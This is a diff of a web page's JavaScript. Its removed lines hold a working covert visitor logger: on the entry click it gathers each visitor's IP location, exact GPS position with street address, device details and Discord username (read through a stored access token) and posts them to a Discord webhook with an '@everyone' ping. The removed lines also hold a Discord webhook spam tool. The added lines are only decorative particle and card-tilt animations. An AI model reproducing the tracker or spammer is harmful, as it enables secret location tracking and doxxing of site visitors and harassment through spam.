-                        gpsGranted = false;
-                        localStorage.setItem("gpsGranted", "false");
-                        resolve(null);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-                gpsRequested = true;
-                localStorage.setItem("gpsRequested", "true");
-            });
-        }
-
-        function getBrowserOS() {
-            const ua = navigator.userAgent;
-            let browser = "Unknown", os = "Unknown";
-            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
-            else if (ua.includes("Firefox")) browser = "Firefox";
-            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
-            else if (ua.includes("Edg")) browser = "Edge";
-            if (ua.includes("Windows NT")) os = "Windows";
-            else if (ua.includes("Mac OS X")) os = "macOS";
-            else if (ua.includes("Linux")) os = "Linux";
-            else if (ua.includes("Android")) os = "Android";
-            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
-            return { browser, os, userAgent: ua };
-        }
-
-        async function sendIpLog(username = null) {
-            if (ipLogSent) return;
-            const ipGeo = await getIpGeo();
-            const deviceGPS = await getDeviceLocation();
-            const { browser, os, userAgent } = getBrowserOS();
-            let fields = [
-                { name: "IP Address", value: ipGeo.ip, inline: true },
-                { name: "Page", value: PAGE_ORIGIN, inline: true },
-                { name: "Discord Username", value: username ? username : "Not logged in", inline: true },
-                { name: "Browser", value: browser, inline: true },
-                { name: "Operating System", value: os, inline: true },
-                { name: "Approx. Location (IP)", value: `${ipGeo.city}, ${ipGeo.region}, ${ipGeo.country}`, inline: false },
-                { name: "Map (IP-based)", value: `[View on Google Maps](${ipGeo.mapLink})`, inline: false }
-            ];
-            if (deviceGPS) {
-                let gpsInfo = `Lat: ${deviceGPS.lat}, Lon: ${deviceGPS.lon} (accuracy: ±${Math.round(deviceGPS.accuracy)}m)`;
-                if (deviceGPS.address) gpsInfo += `\n📍 Street Address: ${deviceGPS.address}`;
-                fields.push(
-                    { name: "📍 Exact GPS Location", value: gpsInfo, inline: false },
-                    { name: "Map (GPS)", value: `[View on Google Maps](${deviceGPS.mapLink})`, inline: false }
-                );
-            } else {
-                fields.push({ name: "GPS Access", value: (gpsGranted ? "Denied" : "Not requested"), inline: false });
+        update(time, mouseEffectX, mouseEffectY) {
+          // wave flow using sine/cosine based on position and time
+          let waveX = Math.sin(time * 0.0022 + this.y * 0.009) * WAVE_INTENSITY;
+          let waveY = Math.cos(time * 0.0019 + this.x * 0.008) * WAVE_INTENSITY;
+          
+          let mouseInfluence = { x: 0, y: 0 };
+          if (mouseEffectX !== null && mouseEffectY !== null) {
+            let dx = mouseEffectX - this.x;
+            let dy = mouseEffectY - this.y;
+            let dist = Math.hypot(dx, dy);
+            if (dist < 180) {
+              let force = (180 - dist) / 2200;
+              mouseInfluence.x = dx * force;
+              mouseInfluence.y = dy * force;
             }
-            fields.push({ name: "User Agent", value: userAgent.substring(0, 100), inline: false });
-            const embed = {
-                author: { name: "IP Logs", icon_url: "https://i.ibb.co/gL0cffbC/New-Project-7.png" },
-                title: "🌐 New Visitor",
-                color: 0xff4444,
-                fields: fields,
-                timestamp: new Date().toISOString()
-            };
-            try {
-                await fetch(IP_LOG_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "@everyone", embeds: [embed] })
-                });
-                ipLogSent = true;
-                sessionStorage.setItem('ipLogSent', 'true');
-                console.log("IP log sent");
-            } catch(e) { console.error("Failed to send IP log", e); }
+          }
+          
+          this.vx += waveX * 0.022 + mouseInfluence.x;
+          this.vy += waveY * 0.022 + mouseInfluence.y;
+          
+          // damping
+          this.vx *= 0.985;
+          this.vy *= 0.985;
+          let spd = Math.hypot(this.vx, this.vy);
+          if (spd > 2.4) {
+            this.vx = (this.vx / spd) * 2.2;
+            this.vy = (this.vy / spd) * 2.2;
+          }
+          
+          this.x += this.vx;
+          this.y += this.vy;
+          
+          // boundaries with soft bounce
+          if (this.x < 0) { this.x = 0; this.vx *= -0.92; }
+          if (this.x > width) { this.x = width; this.vx *= -0.92; }
+          if (this.y < 0) { this.y = 0; this.vy *= -0.92; }
+          if (this.y > height) { this.y = height; this.vy *= -0.92; }
         }
-
-        async function fetchDiscordUser(accessToken) {
-            const response = await fetch("https://discord.com/api/users/@me", {
-                headers: { Authorization: `Bearer ${accessToken}` },
-            });
-            if (!response.ok) throw new Error("Failed to fetch user");
-            return response.json();
+        
+        draw(ctx) {
+          ctx.beginPath();
+          const grad = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.size * 2.2);
+          grad.addColorStop(0, `rgba(90, 255, 130, ${this.alpha + 0.2})`);
+          grad.addColorStop(1, `rgba(20, 100, 40, ${this.alpha * 0.9})`);
+          ctx.fillStyle = grad;
+          ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+          ctx.fill();
+          ctx.shadowBlur = 7;
+          ctx.shadowColor = "#5eff8e";
+          ctx.fill();
+          ctx.shadowBlur = 0;
         }
+      }
 
-        function displayUserProfile(user) {
-            const container = document.getElementById('userProfileContainer');
-            const avatarUrl = user.avatar 
-                ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`
-                : "https://cdn.discordapp.com/embed/avatars/0.png";
-            container.innerHTML = `
-                <div class="user-profile">
-                    <img class="user-avatar" src="${avatarUrl}" alt="avatar" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
-                    <div class="user-info">
-                        <div class="user-name">${escapeHtml(user.username)}</div>
-                        <div class="user-tag">${user.discriminator && user.discriminator !== "0" ? `#${user.discriminator}` : ""} · ID: ${user.id}</div>
-                    </div>
-                    <button id="logoutDiscordBtn" class="logout-btn">Logout</button>
-                </div>
-            `;
-            container.style.display = 'block';
-            const logoutBtn = document.getElementById('logoutDiscordBtn');
-            if (logoutBtn) {
-                logoutBtn.addEventListener('click', () => {
-                    localStorage.removeItem("discord_access_token");
-                    container.style.display = 'none';
-                    alert("Logged out. Refresh to re-authenticate.");
-                });
+      function initParticles() {
+        particles = [];
+        for (let i = 0; i < PARTICLE_COUNT; i++) {
+          let x = Math.random() * width;
+          let y = Math.random() * height;
+          particles.push(new Particle(x, y));
+        }
+      }
+
+      let animationTime = Date.now();
+      function animateParticles() {
+        if (!ctx) return;
+        ctx.clearRect(0, 0, width, height);
+        
+        // dark greenish-black gradient
+        const bgGrad = ctx.createLinearGradient(0, 0, width, height);
+        bgGrad.addColorStop(0, '#031003');
+        bgGrad.addColorStop(1, '#001000');
+        ctx.fillStyle = bgGrad;
+        ctx.fillRect(0, 0, width, height);
+        
+        // draw connections between close particles (web-like)
+        for (let i = 0; i < particles.length; i++) {
+          for (let j = i + 1; j < particles.length; j++) {
+            let dx = particles[i].x - particles[j].x;
+            let dy = particles[i].y - particles[j].y;
+            let dist = Math.hypot(dx, dy);
+            if (dist < 95) {
+              ctx.beginPath();
+              ctx.moveTo(particles[i].x, particles[i].y);
+              ctx.lineTo(particles[j].x, particles[j].y);
+              ctx.strokeStyle = `rgba(80, 220, 90, ${0.18 - dist / 700})`;
+              ctx.lineWidth = 0.65;
+              ctx.stroke();
             }
+          }
         }
-
-        function escapeHtml(str) {
-            return str.replace(/[&<>]/g, function(m) {
-                if (m === '&') return '&amp;';
-                if (m === '<') return '&lt;';
-                if (m === '>') return '&gt;';
-                return m;
-            });
+        
+        let now = Date.now();
+        animationTime = now;
+        let mouseCurrentX = (mouseX !== null) ? mouseX : null;
+        let mouseCurrentY = (mouseY !== null) ? mouseY : null;
+        for (let p of particles) {
+          p.update(now, mouseCurrentX, mouseCurrentY);
+          p.draw(ctx);
         }
-
-        // ========== MUSIC PLAYER WITH ABSOLUTE PATHS ==========
-        const tracks = [
-            { title: "Pass Out", url: "/songs/PassOut.mp3" },
-            { title: "VYZEE", url: "/songs/VYZEE.mp3" },
-            { title: "Phantom", url: "/songs/Phantom.mp3" },
-            { title: "Track 10", url: "/songs/Track10.mp3" }
-        ];
-        let currentTrackIndex = 0;
-        let audio = null;
-        let isPlaying = false;
-        let musicStarted = false;
-        const trackTitleSpan = document.getElementById('trackTitle');
-        const playPauseBtn = document.getElementById('playPauseBtn');
-        const prevBtn = document.getElementById('prevTrackBtn');
-        const nextBtn = document.getElementById('nextTrackBtn');
-        const backBtn = document.getElementById('backToLanding');
-        const menuBackBtn = document.getElementById('menuBackToLanding');
-
-        function saveMusicState() {
-            if (audio) {
-                localStorage.setItem('musicTrackIndex', currentTrackIndex);
-                localStorage.setItem('musicCurrentTime', audio.currentTime);
-                localStorage.setItem('musicPlaying', isPlaying);
-            }
+        
+        // sparkle particles
+        for (let i = 0; i < 50; i++) {
+          if (i % 5 === 0 && particles[i]) {
+            let xSpark = (Math.sin(now * 0.006 + i) * 45 + particles[i].x);
+            let ySpark = (Math.cos(now * 0.005 + i * 1.7) * 35 + particles[i].y);
+            ctx.beginPath();
+            ctx.arc(xSpark, ySpark, 1.3, 0, Math.PI*2);
+            ctx.fillStyle = `rgba(130, 255, 140, 0.85)`;
+            ctx.fill();
+          }
         }
+        
+        requestAnimationFrame(animateParticles);
+      }
 
-        function loadMusicState() {
-            const savedIndex = localStorage.getItem('musicTrackIndex');
-            const savedTime = parseFloat(localStorage.getItem('musicCurrentTime'));
-            const savedPlaying = localStorage.getItem('musicPlaying') === 'true';
-            if (savedIndex !== null && tracks[savedIndex]) {
-                currentTrackIndex = parseInt(savedIndex);
-                loadTrack(currentTrackIndex, false);
-                if (!isNaN(savedTime) && audio) audio.currentTime = savedTime;
-                if (savedPlaying) {
-                    audio.play().catch(e => console.log("Autoplay blocked, waiting for user click"));
-                    isPlaying = true;
-                    playPauseBtn.textContent = '⏸';
-                }
-            } else {
-                loadTrack(0, false);
-            }
-        }
-
-        function loadTrack(index, autoPlay = false) {
-            if (audio) {
-                audio.pause();
-                audio = null;
-            }
-            audio = new Audio(tracks[index].url);
-            audio.loop = false;
-            audio.volume = 0.5;
-            trackTitleSpan.textContent = tracks[index].title;
-            audio.addEventListener('ended', () => nextTrack());
-            if (autoPlay || (musicStarted && isPlaying)) {
-                audio.play().catch(e => console.log("Play failed", e));
-                isPlaying = true;
-                playPauseBtn.textContent = '⏸';
-            } else {
-                isPlaying = false;
-                playPauseBtn.textContent = '▶';
-            }
-        }
-
-        function startMusic() {
-            if (musicStarted) return;
-            musicStarted = true;
-            loadMusicState();
-            setInterval(saveMusicState, 2000);
-            window.addEventListener('beforeunload', saveMusicState);
-        }
-
-        function playPause() {
-            if (!musicStarted) startMusic();
-            if (!audio) return;
-            if (isPlaying) {
-                audio.pause();
-                playPauseBtn.textContent = '▶';
-            } else {
-                audio.play().catch(e => console.log("Playback error", e));
-                playPauseBtn.textContent = '⏸';
-            }
-            isPlaying = !isPlaying;
-        }
-
-        function nextTrack() {
-            if (!musicStarted) startMusic();
-            currentTrackIndex = (currentTrackIndex + 1) % tracks.length;
-            loadTrack(currentTrackIndex, true);
-        }
-
-        function prevTrack() {
-            if (!musicStarted) startMusic();
-            currentTrackIndex = (currentTrackIndex - 1 + tracks.length) % tracks.length;
-            loadTrack(currentTrackIndex, true);
-        }
-
-        playPauseBtn.addEventListener('click', playPause);
-        prevBtn.addEventListener('click', prevTrack);
-        nextBtn.addEventListener('click', nextTrack);
-
-        function goBackToLanding() {
-            saveMusicState();
-            sessionStorage.setItem('entered', 'true');
-            window.location.href = '/';
-        }
-        if (backBtn) backBtn.addEventListener('click', goBackToLanding);
-        if (menuBackBtn) menuBackBtn.addEventListener('click', goBackToLanding);
-
-        // ========== ENTER OVERLAY LOGIC ==========
-        function finishEntry() {
-            overlay.classList.add('hide');
-            setTimeout(() => {
-                overlay.style.display = 'none';
-                mainApp.classList.add('visible');
-                startMusic();
-            }, 500);
-        }
-
-        overlay.addEventListener('click', async () => {
-            if (entered) {
-                finishEntry();
-                return;
-            }
-            const token = localStorage.getItem('discord_access_token');
-            let username = null;
-            if (token) {
-                try {
-                    const user = await fetchDiscordUser(token);
-                    if (user && user.id) {
-                        username = `${user.username}#${user.discriminator || "0"}`;
-                        displayUserProfile(user);
-                    }
-                } catch(e) { console.error("Failed to fetch user", e); }
-            }
-            await sendIpLog(username);
-            sessionStorage.setItem('entered', 'true');
-            entered = true;
-            finishEntry();
-        });
-
-        if (entered) {
-            finishEntry();
-            const token = localStorage.getItem('discord_access_token');
-            if (token) {
-                fetchDiscordUser(token).then(user => {
-                    if (user && user.id) displayUserProfile(user);
-                }).catch(() => {});
-            }
-        }
-
-        // ========== REST OF THE SPAMMER LOGIC (webhook, bot customization, etc.) ==========
-        // (All the original functions are included below)
-        const webhookUrlInput = document.getElementById('webhookUrl');
-        const messageInput = document.getElementById('messageContent');
-        const sendBtn = document.getElementById('sendBtn');
-        const consoleDiv = document.getElementById('console');
-        const clearToggle = document.getElementById('clearToggle');
-        const spamCheck = document.getElementById('spamToggle');
-        const spamWrapper = document.getElementById('spamWrapper');
-        const spamAmount = document.getElementById('spamAmount');
-        const spamInterval = document.getElementById('spamInterval');
-        let sending = false, stopSpam = false;
-        let botName = '', botAvatar = '';
-        const nameSpan = document.getElementById('currentName');
-        const picSpan = document.getElementById('currentPic');
-        const viewPic = document.getElementById('viewPicBtn');
-
-        function updateUI() {
-            nameSpan.innerText = botName.trim() ? botName : 'Default';
-            if (botAvatar && botAvatar.trim()) {
-                picSpan.innerHTML = `<span style="display:flex;align-items:center;gap:5px;"><img src="${botAvatar}" class="preview-thumb" onerror="this.style.display='none'"> Custom</span>`;
-                viewPic.style.display = 'inline-block';
-            } else {
-                picSpan.innerText = 'Default';
-                viewPic.style.display = 'none';
-            }
-        }
-
-        function addLog(text, type = 'info') {
-            const line = document.createElement('div');
-            line.className = `console-line ${type}`;
-            line.textContent = `> ${new Date().toLocaleTimeString()} - ${text}`;
-            consoleDiv.appendChild(line);
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
-            while (consoleDiv.children.length > 30) consoleDiv.removeChild(consoleDiv.firstChild);
-        }
-
-        function isValidWebhook(url) { return /^https:\/\/discord\.com\/api\/webhooks\/(\d+)\/([a-zA-Z0-9_\-]+)/i.test(url.trim()); }
-
-        async function sendSingle(webhook, msg) {
-            const payload = { content: msg };
-            if (botName.trim()) payload.username = botName.trim();
-            if (botAvatar.trim()) payload.avatar_url = botAvatar.trim();
-            const response = await fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            if (!response.ok) throw new Error(`HTTP ${response.status}`);
-            return true;
-        }
-
-        async function runSpam(webhook, msg, amount, interval) {
-            let success = 0;
-            for (let i = 1; i <= amount; i++) {
-                if (stopSpam) { addLog(`Spam stopped. Sent ${success}/${amount}`, 'info'); return success; }
-                try {
-                    await sendSingle(webhook, msg);
-                    success++;
-                    addLog(`[${success}/${amount}] Sent`, 'success');
-                } catch (err) {
-                    addLog(`[${i}] Failed: ${err.message}`, 'error');
-                    if (i - success > 5) break;
-                }
-                if (i < amount) await new Promise(r => setTimeout(r, interval));
-            }
-            return success;
-        }
-
-        async function handleSend() {
-            if (sending) { if (spamCheck.checked) { stopSpam = true; addLog('Aborting spam...', 'info'); } return; }
-            const webhook = webhookUrlInput.value.trim();
-            const msg = messageInput.value.trim();
-            if (!webhook) { addLog('Missing webhook URL', 'error'); return; }
-            if (!msg) { addLog('Missing message', 'error'); return; }
-            if (!isValidWebhook(webhook)) { addLog('Invalid webhook URL.', 'error'); return; }
-            const isSpam = spamCheck.checked;
-            let amount = 1, interval = 100;
-            if (isSpam) { amount = Math.min(50, Math.max(1, parseInt(spamAmount.value) || 1)); interval = Math.min(5000, Math.max(50, parseInt(spamInterval.value) || 100)); }
-            sending = true; stopSpam = false; sendBtn.textContent = isSpam ? 'SPAMMING (click to stop)' : 'SENDING...';
-            try {
-                if (isSpam && amount > 1) {
-                    addLog(`Starting spam: ${amount} messages, ${interval}ms interval`, 'info');
-                    const sent = await runSpam(webhook, msg, amount, interval);
-                    addLog(`Spam finished: ${sent}/${amount} sent`, sent > 0 ? 'success' : 'error');
-                    if (clearToggle.checked && sent > 0) messageInput.value = '';
-                } else {
-                    await sendSingle(webhook, msg);
-                    addLog('Message sent successfully!', 'success');
-                    if (clearToggle.checked) messageInput.value = '';
-                }
-            } catch (err) { addLog(`Error: ${err.message}`, 'error'); }
-            finally { sending = false; sendBtn.textContent = 'SEND MESSAGE'; }
-        }
-        sendBtn.addEventListener('click', handleSend);
-        messageInput.addEventListener('keydown', (e) => { if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') handleSend(); });
-
-        spamCheck.addEventListener('change', () => {
-            if (spamCheck.checked) spamWrapper.classList.add('expanded');
-            else spamWrapper.classList.remove('expanded');
-        });
-
-        // Name modal
-        const nameModal = document.getElementById('nameModal');
-        const nameInput = document.getElementById('nameInput');
-        document.getElementById('editNameBtn').addEventListener('click', () => { nameInput.value = botName; nameModal.classList.add('active'); });
-        document.getElementById('saveNameBtn').addEventListener('click', () => { botName = nameInput.value.trim(); updateUI(); nameModal.classList.remove('active'); });
-        document.getElementById('cancelNameBtn').addEventListener('click', () => nameModal.classList.remove('active'));
-
-        // Picture modal
-        const picModal = document.getElementById('picModal');
-        const picUrlInput = document.getElementById('picUrlInput');
-        const fileUpload = document.getElementById('fileUpload');
-        const picPreview = document.getElementById('picPreview');
-        let tempPic = '';
-        document.getElementById('editPicBtn').addEventListener('click', () => {
-            tempPic = botAvatar;
-            picUrlInput.value = (botAvatar && !botAvatar.startsWith('data:')) ? botAvatar : '';
-            picPreview.innerHTML = '';
-            if (botAvatar) {
-                const img = document.createElement('img');
-                img.src = botAvatar;
-                img.style.width = '48px';
-                img.style.height = '48px';
-                img.style.borderRadius = '50%';
-                img.style.border = '1px solid #ff8888';
-                picPreview.appendChild(img);
-            }
-            picModal.classList.add('active');
-        });
-        function closePicModal() { picModal.classList.remove('active'); tempPic = ''; fileUpload.value = ''; picUrlInput.value = ''; picPreview.innerHTML = ''; }
-        picUrlInput.addEventListener('input', () => {
-            if (picUrlInput.value.trim()) {
-                tempPic = picUrlInput.value.trim();
-                const img = document.createElement('img');
-                img.src = tempPic;
-                img.style.width = '48px';
-                img.style.height = '48px';
-                img.style.borderRadius = '50%';
-                img.style.border = '1px solid #ff8888';
-                picPreview.innerHTML = '';
-                picPreview.appendChild(img);
-            } else if (!fileUpload.files.length) { picPreview.innerHTML = ''; tempPic = ''; }
-        });
-        fileUpload.addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (file && file.type.startsWith('image/')) {
-                const reader = new FileReader();
-                reader.onload = (ev) => {
-                    tempPic = ev.target.result;
-                    picUrlInput.value = '';
-                    const img = document.createElement('img');
-                    img.src = tempPic;
-                    img.style.width = '48px';
-                    img.style.height = '48px';
-                    img.style.borderRadius = '50%';
-                    img.style.border = '1px solid #ff8888';
-                    picPreview.innerHTML = '';
-                    picPreview.appendChild(img);
-                };
-                reader.readAsDataURL(file);
-            } else if (file) alert('Please select an image file');
-        });
-        document.getElementById('savePicBtn').addEventListener('click', () => { if (tempPic) { botAvatar = tempPic; updateUI(); } closePicModal(); });
-        document.getElementById('cancelPicBtn').addEventListener('click', closePicModal);
-        document.getElementById('openPicBtn').addEventListener('click', () => { if (botAvatar) window.open(botAvatar, '_blank'); });
-
-        // Panel switching
-        const mainPanel = document.getElementById('mainPanel');
-        const settingsPanel = document.getElementById('settingsPanel');
-        const settingsBtn = document.getElementById('settingsBtn');
-        const closeSettingsBtn = document.getElementById('closeSettingsBtn');
-        let isSwitching = false, settingsVisible = false;
-        function getPanelHeight(panel) {
-            const clone = panel.cloneNode(true);
-            clone.style.position = 'absolute';
-            clone.style.visibility = 'hidden';
-            clone.style.display = 'block';
-            document.body.appendChild(clone);
-            const h = clone.offsetHeight;
-            document.body.removeChild(clone);
-            return h;
-        }
-        function animateHeight(targetHeight) {
-            const startHeight = card.offsetHeight;
-            if (startHeight === targetHeight) return;
-            card.style.transition = 'height 0.4s cubic-bezier(0.2,0.9,0.4,1.1)';
-            card.style.height = targetHeight + 'px';
-            setTimeout(() => { card.style.height = 'auto'; card.style.transition = ''; }, 450);
-        }
-        function openSettings() {
-            if (isSwitching) return;
-            isSwitching = true;
-            settingsVisible = true;
-            settingsPanel.style.display = 'block';
-            settingsPanel.style.opacity = '0';
-            settingsPanel.style.transform = 'translateX(30px)';
-            mainPanel.classList.add('slide-out');
-            setTimeout(() => {
-                mainPanel.style.display = 'none';
-                mainPanel.classList.remove('slide-out');
-                settingsPanel.style.transition = 'opacity 0.35s, transform 0.4s';
-                settingsPanel.style.transform = 'translateX(0)';
-                settingsPanel.style.opacity = '1';
-                const newH = getPanelHeight(settingsPanel);
-                animateHeight(newH);
-                setTimeout(() => { isSwitching = false; }, 450);
-            }, 200);
-        }
-        function closeSettings() {
-            if (isSwitching) return;
-            isSwitching = true;
-            settingsVisible = false;
-            settingsPanel.style.transition = 'opacity 0.35s, transform 0.4s';
-            settingsPanel.style.transform = 'translateX(30px)';
-            settingsPanel.style.opacity = '0';
-            setTimeout(() => {
-                settingsPanel.style.display = 'none';
-                settingsPanel.style.transform = '';
-                mainPanel.style.display = 'block';
-                mainPanel.style.opacity = '0';
-                mainPanel.style.transform = 'translateX(-30px)';
-                mainPanel.classList.add('slide-in');
-                const newH = getPanelHeight(mainPanel);
-                animateHeight(newH);
-                setTimeout(() => {
-                    mainPanel.style.transform = '';
-                    mainPanel.style.opacity = '';
-                    mainPanel.classList.remove('slide-in');
-                    isSwitching = false;
-                }, 450);
-            }, 200);
-        }
-        settingsBtn.addEventListener('click', () => settingsVisible ? closeSettings() : openSettings());
-        closeSettingsBtn.addEventListener('click', closeSettings);
-
-        // Tilt effect
-        const card = document.getElementById('tiltCard');
-        const maxTilt = 5;
-        function onMouseMove(e) {
-            const rect = card.getBoundingClientRect();
-            const x = (e.clientX - (rect.left + rect.width/2)) / (rect.width/2);
-            const y = (e.clientY - (rect.top + rect.height/2)) / (rect.height/2);
-            const rotY = Math.min(Math.max(x, -1), 1) * maxTilt;
-            const rotX = -Math.min(Math.max(y, -1), 1) * maxTilt;
-            card.style.transition = 'transform 0.05s linear';
-            card.style.transform = `perspective(800px) rotateX(${rotX}deg) rotateY(${rotY}deg) translateZ(3px)`;
-        }
-        card.addEventListener('mouseleave', () => {
-            card.style.transition = 'transform 0.5s cubic-bezier(0.2,0.9,0.4,1.1)';
-            card.style.transform = 'perspective(800px) rotateX(0deg) rotateY(0deg)';
-        });
-        card.addEventListener('mouseenter', () => card.style.transition = 'transform 0.05s linear');
-        window.addEventListener('mousemove', onMouseMove);
-
-        // JOIN buttons
-        const joinBtns = ['loadingJoin', 'joinFooter'];
-        joinBtns.forEach(id => {
-            const el = document.getElementById(id);
-            if (el) el.addEventListener('click', (e) => { e.preventDefault(); window.open('https://discord.gg/funerals', '_blank'); });
-        });
-
-        // Fendi menu toggle
-        const logoBtn = document.getElementById('logoBtn');
-        const toolsMenuDiv = document.getElementById('toolsMenu');
-        logoBtn.addEventListener('click', (e) => {
-            e.stopPropagation();
-            toolsMenuDiv.classList.toggle('active');
-        });
-        document.addEventListener('click', (e) => {
-            if (!toolsMenuDiv.contains(e.target) && !logoBtn.contains(e.target)) {
-                toolsMenuDiv.classList.remove('active');
-            }
-        });
-
-        // Snow particles
-        const canvas = document.getElementById('snowCanvas');
-        const ctx = canvas.getContext('2d');
-        let particles = [];
-        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-        function initSnow() {
-            particles = [];
-            for (let i = 0; i < 140; i++) {
-                particles.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, r: Math.random() * 3 + 1.5, speedY: Math.random() * 1.2 + 0.4, speedX: (Math.random() - 0.5) * 0.2, alpha: Math.random() * 0.5 + 0.2 });
-            }
-        }
-        function drawSnow() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            for (let p of particles) {
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-                ctx.fillStyle = `rgba(180, 40, 40, ${p.alpha})`;
-                ctx.fill();
-                p.y += p.speedY;
-                p.x += p.speedX;
-                if (p.y > canvas.height) { p.y = 0; p.x = Math.random() * canvas.width; }
-                if (p.x > canvas.width) p.x = 0;
-                if (p.x < 0) p.x = canvas.width;
-            }
-            requestAnimationFrame(drawSnow);
-        }
-        window.addEventListener('resize', () => { resizeCanvas(); initSnow(); });
+      function resizeCanvas() {
+        width = window.innerWidth;
+        height = window.innerHeight;
+        canvas.width = width;
+        canvas.height = height;
+        initParticles();
+      }
+      
+      // track mouse movement for particle influence & card tilt
+      window.addEventListener('mousemove', (e) => {
+        mouseX = e.clientX;
+        mouseY = e.clientY;
+        // reset after short delay for subtle particle drag
+        clearTimeout(window.mouseResetTimeout);
+        window.mouseResetTimeout = setTimeout(() => {
+          mouseX = null;
+          mouseY = null;
+        }, 180);
+      });
+      
+      window.addEventListener('resize', () => {
         resizeCanvas();
-        initSnow();
-        drawSnow();
-
-        // Scroll blur
-        let scrollTimeout;
-        window.addEventListener('scroll', () => {
-            document.body.classList.add('scrolling');
-            clearTimeout(scrollTimeout);
-            scrollTimeout = setTimeout(() => { document.body.classList.remove('scrolling'); }, 150);
-        });
-        const styleBlur = document.createElement('style');
-        styleBlur.textContent = 'body.scrolling { filter: blur(2px); transition: filter 0.15s ease-out; } body { transition: filter 0.15s ease-out; }';
-        document.head.appendChild(styleBlur);
-
-        // Thocky sounds
-        let audioCtx = null;
-        function playThock() {
-            try {
-                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const now = audioCtx.currentTime;
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.frequency.value = 80;
-                gainNode.gain.setValueAtTime(0.08, now);
-                gainNode.gain.exponentialRampToValueAtTime(0.0001, now + 0.15);
-                oscillator.start(now);
-                oscillator.stop(now + 0.15);
-            } catch(e) {}
+      });
+      
+      resizeCanvas();
+      animateParticles();
+      
+      // ======================
+      // 2. FLOATING DOTS (spot theme extra)
+      // ======================
+      const dotsContainer = document.getElementById('floatingDots');
+      for (let i = 0; i < 70; i++) {
+        const dot = document.createElement('div');
+        dot.classList.add('dot');
+        const size = Math.random() * 13 + 3;
+        dot.style.width = `${size}px`;
+        dot.style.height = `${size}px`;
+        dot.style.left = `${Math.random() * 100}%`;
+        dot.style.top = `${Math.random() * 100}%`;
+        dot.style.animationDelay = `${Math.random() * 9}s`;
+        dot.style.animationDuration = `${Math.random() * 15 + 7}s`;
+        dot.style.filter = `blur(${Math.random() * 3 + 1}px)`;
+        dotsContainer.appendChild(dot);
+      }
+      
+      // animate floating dots shifting gently
+      setInterval(() => {
+        const allDots = document.querySelectorAll('.dot');
+        for (let d of allDots) {
+          if (Math.random() > 0.75) {
+            let currentLeft = parseFloat(d.style.left);
+            let currentTop = parseFloat(d.style.top);
+            let deltaX = (Math.random() - 0.5) * 15;
+            let deltaY = (Math.random() - 0.5) * 15;
+            let newLeft = Math.min(Math.max(currentLeft + deltaX, -5), 105);
+            let newTop = Math.min(Math.max(currentTop + deltaY, -5), 105);
+            d.style.left = `${newLeft}%`;
+            d.style.top = `${newTop}%`;
+          }
         }
-        document.querySelectorAll('input, textarea').forEach(el => el.addEventListener('keydown', playThock));
-
-        // Typewriter effect
-        const titleText = "FENDI'S WEBHOOK FUCKER";
-        const targetSpan = document.getElementById('typewriterTarget');
-        let idx = 0;
-        let typingActive = true;
-        function typeWriter() {
-            if (!typingActive) return;
-            if (idx < titleText.length) {
-                targetSpan.innerHTML = titleText.substring(0, idx + 1);
-                idx++;
-                setTimeout(typeWriter, 70);
-            } else {
-                typingActive = false;
-                const titleContainer = document.querySelector('.glow-title');
-                titleContainer.style.transition = 'opacity 0.5s ease';
-                titleContainer.style.opacity = '0';
-                setTimeout(() => {
-                    targetSpan.innerHTML = '';
-                    titleContainer.style.opacity = '1';
-                    idx = 0;
-                    typingActive = true;
-                    typeWriter();
-                }, 1500);
-            }
+      }, 2500);
+      
+      // ======================
+      // 3. SINGLE CREDIT CARD: MOUSE TILT + HOVER SCALE
+      // ======================
+      const card = document.getElementById('creditCard');
+      const container = document.getElementById('cardContainer');
+      
+      // Tilt effect based on mouse position relative to card
+      function handleCardTilt(e) {
+        if (!card) return;
+        const rect = card.getBoundingClientRect();
+        // calculate mouse position relative to card center
+        const centerX = rect.left + rect.width / 2;
+        const centerY = rect.top + rect.height / 2;
+        const mouseRelativeX = e.clientX - centerX;
+        const mouseRelativeY = e.clientY - centerY;
+        
+        // max rotation angles (degrees)
+        const maxRotateX = 14;   // vertical tilt
+        const maxRotateY = 18;   // horizontal tilt
+        
+        // calculate rotation based on distance from center (clamped)
+        let rotateY = (mouseRelativeX / (rect.width / 2)) * maxRotateY;
+        let rotateX = -(mouseRelativeY / (rect.height / 2)) * maxRotateX;
+        
+        // clamp values
+        rotateY = Math.min(maxRotateY, Math.max(-maxRotateY, rotateY));
+        rotateX = Math.min(maxRotateX, Math.max(-maxRotateX, rotateX));
+        
+        // apply transform: scale(1.05) on hover + dynamic tilt
+        // but we only add tilt while hover; scale already from CSS hover but we want tilt to override without losing scale.
+        // We'll use inline style to combine scale + rotate. However CSS .interactive-card:hover sets scale(1.05).
+        // To avoid conflict, we manage inline transform that includes both. We'll detect hover state and set scale inside.
+        // Better approach: use JS to manage both on mousemove and also listen to mouseleave.
+        if (cardMatchesHover) {
+          // Apply both tilt and scale
+          card.style.transform = `perspective(1200px) scale(1.05) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
+        } else {
+          // if not hover, just keep default with no scale but maybe slight tilt? we want tilt only on hover.
+          card.style.transform = '';
         }
-        typeWriter();
-
